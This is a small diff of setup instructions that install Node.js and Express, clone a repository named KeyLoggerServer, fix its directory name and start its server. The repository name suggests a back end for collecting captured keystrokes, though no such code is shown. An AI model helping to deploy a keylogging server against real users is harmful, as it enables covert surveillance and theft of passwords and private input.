@@ -15,11 +15,13 @@ sudo yum install -y npm
 # Install Express.js globally
 sudo npm install -g express
 
+npm install express
+
 # Clone the repository
 git clone https://github.com/SatyamPundir/KeyLoggerServer.git
 
 # Navigate to the cloned directory
-cd KeyLoggerServer.git
+cd KeyLoggerServer
 
 # Start the server
 node server.js
